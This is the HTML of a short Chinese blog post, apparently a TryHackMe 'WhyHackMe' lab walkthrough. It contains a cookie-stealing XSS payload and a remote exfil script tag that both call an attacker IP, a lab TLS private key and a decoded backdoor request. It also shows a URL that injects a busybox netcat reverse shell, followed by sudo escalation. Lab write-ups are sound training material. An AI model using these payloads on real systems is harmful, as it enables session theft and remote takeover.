@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>WhyHackMe | MoonlitSyntax</title><meta name="author" content="dionysus"><meta name="copyright" content="dionysus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ftp  &lt;script&gt;fetch(&quot;http:&#x2F;&#x2F;10.17.6.173:9000&quot;,&#123;method: &quot;POST&quot;, body: document.cookie&#125;);&lt;&#x2F;script&gt; 注册时候xss,文件在kali的css文件夹里 &lt;script src&#x3D;http:&#x2F;&#x2F;10.17.6.173:9000">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WhyHackMe">
+<meta property="og:url" content="https://blog.siren.blue/2024/06/07/try-hack-me/ROOMS/day17/WhyHackMe/index.html">
+<meta property="og:site_name" content="MoonlitSyntax">
+<meta property="og:description" content="ftp  &lt;script&gt;fetch(&quot;http:&#x2F;&#x2F;10.17.6.173:9000&quot;,&#123;method: &quot;POST&quot;, body: document.cookie&#125;);&lt;&#x2F;script&gt; 注册时候xss,文件在kali的css文件夹里 &lt;script src&#x3D;http:&#x2F;&#x2F;10.17.6.173:9000">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.siren.blue/img/3.jpg">
+<meta property="article:published_time" content="2024-06-07T12:13:33.000Z">
+<meta property="article:modified_time" content="2024-06-08T03:29:59.383Z">
+<meta property="article:author" content="dionysus">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.siren.blue/img/3.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.siren.blue/2024/06/07/try-hack-me/ROOMS/day17/WhyHackMe/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"GNDO5PR146","apiKey":"1423d4e114f7a03240e8700efd01af02","indexName":"moonlit","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WhyHackMe',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-06-08 11:29:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/18.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/3.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoonlitSyntax"><span class="site-name">MoonlitSyntax</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WhyHackMe</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-07T12:13:33.000Z" title="发表于 2024-06-07 20:13:33">2024-06-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-08T03:29:59.383Z" title="更新于 2024-06-08 11:29:59">2024-06-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/">TryHackMe</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">548</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>ftp<br>
+<img src="/z-img/Pasted%20image%2020240210105441.png" alt="Pasted%20image%2020240210105441"></p>
+<p><code>&lt;script&gt;fetch(&quot;http://10.17.6.173:9000&quot;,&#123;method: &quot;POST&quot;, body: document.cookie&#125;);&lt;/script&gt;</code></p>
+<p>注册时候xss,文件在kali的css文件夹里<br>
+<code>&lt;script src=http://10.17.6.173:9000/exfil.js&gt;&lt;/script&gt;</code></p>
+<p><img src="/z-img/Pasted%20image%2020240210112436.png" alt="Pasted%20image%2020240210112436"></p>
+<p>怎么找到的</p>
+<p><img src="/z-img/Pasted%20image%2020240210112539.png" alt="Pasted%20image%2020240210112539"></p>
+<p>这就是给iptables sudo权限的原因吗</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/iptables -L --line-numbers</span><br><span class="line">sudo /usr/sbin/iptables -D INPUT</span><br><span class="line">sudo /usr/sbin/iptables -I INPUT -p tcp --dport 41312 -j ACCEPT</span><br></pre></td></tr></table></figure>
+<p><code>find / -name &quot;*.key&quot; 2&gt; /dev/null</code><br>
+流量是tls,先找密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQDOkNCaT0sHHS1X</span><br><span class="line">/IjqenvRFL5xjYQz38NZ/uZJYtaYTHHZmzE2mXTU4J1rXlKFVeQ6t3j3BenyxGGI</span><br><span class="line">z/EDQqPoxO7D10PzSw5dvGGUcnYA/hgp5XPUijvtHMcMtqlupI15EMel9Cf0aFMY</span><br><span class="line">U1O2nM0YoRpviZn+3rQ7SOzBr+zvo3pmZHe4BK9EO/rnbjmZgWkEa52wgNvy5Lni</span><br><span class="line">hGt9jx2YtTGJtpEqc+ytb6EapU7LSrwDem05DOc/35NvHO+WX/fboN1+l9WVXwxP</span><br><span class="line">dTBx/z5TykrPKjSSTBwzIVjqSmJS82m6NV1278P7JL/qGIBJcJq+AOZ9S0M9WsWs</span><br><span class="line">LVApqvqwT4gtgGoPH0mfYlkcJqFi/raM8GhFqYthAne1L73ZbGeCelKi0bjp1Ixd</span><br><span class="line">0EE1PHrF+Cvr84cke6RXJWA6SCW1y6Xug3ltJhFSagsINzpIqBj6AfHuGPyG3MNO</span><br><span class="line">b9wIpHBL0duw1nEnJN2WNUfdIqB+41/Ihn/m8fbb3KyR7UbxE9iCto1/iMvi/DfW</span><br><span class="line">HioVKPOlWtrGBXtABjHnVSSzDciMq4EyM+FNqUauwYebONs95FOIdJX6zssXxlze</span><br><span class="line">3ZsyBuCAhy5UEOHCm3Au7NQgjGY+9jx3MXOEMfZiMGUOcTE2e/0+pUV7cLQNQbFP</span><br><span class="line">lWXZ+CB/czyvgthZLKDUa8zXqObzpQIDAQABAoICAAkOLiblnPtl2wwFZRcqYW0s</span><br><span class="line">BKFDu+zuPUkftIa5D4FDsKYCeKjVF1sRsbT4QJPZzRSJ4IKrvrLGyyPNQdqLvFXC</span><br><span class="line">9FifgjoTK0EOthRk5Cls+jAz/9zsZm4hmdRD2a+hBRaulqH+zxWW0TW6yWuy+ga/</span><br><span class="line">YUJMfPTAXJRQwRhIlxF2UDJW6yyk/+301y34FgxVsP3hndsT+xBt2HxGo9OwR3Lf</span><br><span class="line">Vpmb6Ec9J73+q8hYQNkGoLFiV5FtsGGLcpInaZVlBZ+aMLuQ+mr+7LI7B/GnZ9sS</span><br><span class="line">fi8QwZc8QOw45QX4VtEeHJ9uIXfKUQQce1FO26jch9wWfAQ4HW1+IjZHEkGRXkXy</span><br><span class="line">Ow8SatGIXev8fMoGgFc4M/QRQUPOlAevsWPwKD8o6gaggDU1DPiqDb1yBLPFaBGJ</span><br><span class="line">STTjvO1LFtpHgNNKvD9fPVQKLZ7poSxnHuEwt9+yyQWvufVB5eDj8IncZz5FCs52</span><br><span class="line">uctxmyHKzjzTRuytQBk70g9xIVOS8bsVK9nojxAlh3ywyHdykIUEzqrZgTxAGZ+e</span><br><span class="line">/TpSIpeAvKRbM0HZ+ePyEU33p9FYGNvLGLUEuXoUDA2Tla4d/zXxnBVviva4AKhh</span><br><span class="line">vbLzkHpp0JQoIVjgZQUBqICk9yG3uA/dKRG+w4zkkdowvFFsaosiwRlCcOc+Ihj7</span><br><span class="line">/iOngWUOfGKOkIJv8Q0hAoIBAQDsj+dl8xB2fzvxMA/L1Vff/VxLqsnQUnltXQ14</span><br><span class="line">2Gcj+Mkm8mLVrJawwW2xCUFMsDHBjc+m9ZkEwVOffJ34vT57/OKTCCkh0afRPNK4</span><br><span class="line">vKgue0cRDZCKYHYjiIYgekzrFO0w2e4yk5wF6OR1VZYqmWengA6xJ93+TT1LyvTW</span><br><span class="line">k9dJ9aqtJqlziVz+1t2KrQ/yL5cHONCpCZp538o3TqfcHxGZO/btvy/wHyGF8Ypg</span><br><span class="line">lEGzI1kVZd37Sh7NDieJriYdxTvwPEymq/JrMj8WN/urnsqufgybVtaKTvGns7DB</span><br><span class="line">ircqnnQliNFhoZIeemskyfcLUI6kKbjjlLUgQUsMj97436xtAoIBAQDfie8u4TaD</span><br><span class="line">Dvfa8tORkHTtygHBZwvEkHjCioPvMcgTwS/3nLCAcWVQqnWIy56QX6hR0VSeYjoc</span><br><span class="line">E0atQ689XFaQ6Yi7GTitipnocMx5fr+DnueJHalmDfYCFGVRsHFLqUq2A0KPUeEz</span><br><span class="line">zcnDLS4XxO5uSAuGrzTbT0OZFbu0VGhqfJ7Ok/3/4KI1AjF/ydng9/CwZ6flaCUH</span><br><span class="line">XMxP29S60X7+6Yn1J9GigO8p5hJ/1yzi2lInvdEdhW7gWwI1rwF8/PAVBb+pWQMK</span><br><span class="line">o+BFUrh1rwDq2b6pBbel5D8mU4vbjZQRl+3SStzIl7vNNO5IUZnEJlzL8cIrsKfj</span><br><span class="line">+BTTmp8B33EZAoIBAE/rihSyWoR+FcU1JJELoaWF1jGmIIpl4qok/tEt4yKPAX5L</span><br><span class="line">80IXDc3ne2SNKOd8u0KV42qXnLuziMnf8wq+/KYs2GsuHZ9UUmrpLpPFANi7Q1Yq</span><br><span class="line">jAOD9UWp8Q514xikuEGBzux9W//PH6fYY2Q+8XrwU4ZcXq50b9n0VmVMCzbsbV4U</span><br><span class="line">Krli1e0usCgSsclzdIW3Fx+UpAC6r3mh9Cn0wSBQ1uqZZdus2MmEwehBDjU0IvuM</span><br><span class="line">r8Me1msWdhsYn739DXPrG0ZP3xWCIzghb8AaZIUxBpdQbijJ5PBwT64DbEBUyg6I</span><br><span class="line">O5zNVi0/1ITYSsMi0x35DoKskci05mL3FDBmeL0CggEAK51rGJeCnlGmVIb6drVb</span><br><span class="line">yyWV8Bld921E0phaI6pv4kLYTBS7b2Qwo2uO4TDxcDPp0ITqYLjDo8SzDo1dPLiu</span><br><span class="line">fznBntfN8jZPz0Vq7+2mClVP0bYC3lGtBTzbg/PMNzoBxL+gFfyg1w245ycCjkqz</span><br><span class="line">Rrsx3IaE5qFxjAXsiMPLV7OW/LFtZqZ6n6Mc61UD+NwHjzO6U41dZDFb/9zhhc3o</span><br><span class="line">XG5Op5GsWmuTvnYQd/cQ3/Y+/1gO3BazynyXUsghnzRu13s2qSEf8cyFrqD0MqoB</span><br><span class="line">oND5XVsrOOfu1liIuj7GfCRLl7NZnp3UW7aPI3cgbGAbzQMPopymNVmrHppVmfTx</span><br><span class="line">yQKCAQEAjHHXVVNG1MczDSxiScDxKwHA4bjk8+FcLmIs0AHEPy1y58ZG5ztG9rsj</span><br><span class="line">mvSqOXdrK2Gq3x9QqGI1Y7AqPHirBoq7U4UVhDCeEPALCjwKFQz/b1YfZYtUu7uY</span><br><span class="line">2oZ7GmKD1MUNnkzp9BjC02JclSFglb/PpHMhYZSB4W0P8mJtsJCkVd4LpthhuVJn</span><br><span class="line">tc0d+it0CVQSko3I6qN535x1KzlFkGy8i/P+nvBeCzbccV9fakubxk68OMmgflWA</span><br><span class="line">tBlKzXdlqLoHbWLptdcQhV8pisZrLhd42C+YFb+LY34EQ3MSq/JTPQab73Zxb1qY</span><br><span class="line">8zgwXPatVQA2vA1aN1A1anOcmGZPQg==</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+<p><img src="/z-img/Pasted%20image%2020240210115219.png" alt="Pasted%20image%2020240210115219"><br>
+导入tls证书</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Frame 69: 631 bytes on wire (5048 bits), 631 bytes captured (5048 bits)</span><br><span class="line">Ethernet II, Src: PCSSystemtec_65:c7:bf (08:00:27:65:c7:bf), Dst: PCSSystemtec_7f:2f:1d (08:00:27:7f:2f:1d)</span><br><span class="line">Internet Protocol Version 4, Src: 10.133.71.33, Dst: 10.13.64.69</span><br><span class="line">Transmission Control Protocol, Src Port: 58654, Dst Port: 41312, Seq: 1116, Ack: 1660, Len: 565</span><br><span class="line">Transport Layer Security</span><br><span class="line">Hypertext Transfer Protocol</span><br><span class="line">    GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id HTTP/1.1\r\n</span><br><span class="line">        [Expert Info (Chat/Sequence): GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id HTTP/1.1\r\n]</span><br><span class="line">        Request Method: GET</span><br><span class="line">        Request URI: /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id</span><br><span class="line">        Request Version: HTTP/1.1</span><br><span class="line">    Host: 10.0.2.15:41312\r\n</span><br><span class="line">    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n</span><br><span class="line">    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n</span><br><span class="line">    Accept-Language: en-US,en;q=0.5\r\n</span><br><span class="line">    Accept-Encoding: gzip, deflate, br\r\n</span><br><span class="line">    DNT: 1\r\n</span><br><span class="line">    Connection: keep-alive\r\n</span><br><span class="line">    Upgrade-Insecure-Requests: 1\r\n</span><br><span class="line">    Sec-Fetch-Dest: document\r\n</span><br><span class="line">    Sec-Fetch-Mode: navigate\r\n</span><br><span class="line">    Sec-Fetch-Site: none\r\n</span><br><span class="line">    Sec-Fetch-User: ?1\r\n</span><br><span class="line">    \r\n</span><br><span class="line">    [Full request URI: https://10.0.2.15:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id]</span><br><span class="line">    [HTTP request 1/1]</span><br><span class="line">    [Response in frame: 71]</span><br></pre></td></tr></table></figure>
+<p><code>https://10.10.239.33:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id</code></p>
+<p>记得是https,直接拿下<br>
+<code>https://10.10.239.33:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=busybox nc 10.17.6.173 9999 -e bash</code></p>
+<p>sudo -l直接提权</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/07/try-hack-me/%E9%80%86%E5%A4%A9/Team/" title="Team"><img class="cover" src="/img/5.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Team</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/07/try-hack-me/ROOMS/day44/Anonforce/" title="Anonforce"><img class="cover" src="/img/7.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Anonforce</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dionysus</div><div class="author-info__description">我醉欲眠卿且去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">303</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoonlitSyntax"><i class="fab fa-github"></i><span>此心安处</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont  icon-weixin"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1475856026" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a><a class="social-icon" href="https://space.bilibili.com/430091327?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="mailto:1475856026@qq.com" target="_blank" title="QQ邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="https://chat.openai.com" target="_blank" title="chatgpt"><i class="iconfont icon-ai"></i></a><a class="social-icon" href="https://www.luogu.com.cn" target="_blank" title="洛谷"><i class="iconfont icon-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-pinglun-1"></use></svg></a><span>公告</span></div><div class="announcement_content"><script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> <div id="poem_sentence"></div> <div id="poem_info"></div> <script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+
+    var content = result.data.origin.content;
+
+    // 分割诗句为数组
+    var splitContent = [];
+    content.forEach(line => {
+        var phrases = line.split(/([。，])/);
+        for (var i = 0; i < phrases.length; i += 2) {
+            var phrase = phrases[i];
+            if (i + 1 < phrases.length) {
+                phrase += phrases[i + 1];
+            }
+            splitContent.push(phrase);
+        }
+    });
+
+    // 构建新的诗句
+    var newContent = "";
+    var line = "";
+    for (var i = 0; i < splitContent.length; i++) {
+        if (line.length + splitContent[i].length <= 15) {
+            line += splitContent[i];
+        } else {
+            newContent += line + '<br>';
+            line = splitContent[i];
+        }
+    }
+    newContent += line;
+
+    sentence.innerHTML = newContent;
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》';
+  });
+</script>
+</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7"><img src="/img/4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="复习一下反序列化 cc1-cc7"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%B8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20cc1-cc7/" title="复习一下反序列化 cc1-cc7">复习一下反序列化 cc1-cc7</a><time datetime="2024-06-07T15:27:00.000Z" title="发表于 2024-06-07 23:27:00">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Fastjson"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/java/Fastjson/" title="Fastjson">Fastjson</a><time datetime="2024-06-07T15:26:21.000Z" title="发表于 2024-06-07 23:26:21">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改"><img src="/img/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo魔改"/></a><div class="content"><a class="title" href="/2024/06/07/IT%E6%97%A5%E5%B8%B8/hexo%E9%AD%94%E6%94%B9/" title="hexo魔改">hexo魔改</a><time datetime="2024-06-07T15:21:11.000Z" title="发表于 2024-06-07 23:21:11">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题"><img src="/img/24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2024/06/07/ctf/python/%E5%86%85%E5%AD%98%E9%A9%AC/" title="无题">无题</a><time datetime="2024-06-07T15:14:08.002Z" title="发表于 2024-06-07 23:14:08">2024-06-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system"><img src="/img/23.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="login system"/></a><div class="content"><a class="title" href="/2024/06/07/Writeups/HITCON/login%20system/" title="login system">login system</a><time datetime="2024-06-07T13:37:43.000Z" title="发表于 2024-06-07 21:37:43">2024-06-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By dionysus</div><div class="footer_custom_text">此心安处是吾乡</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" 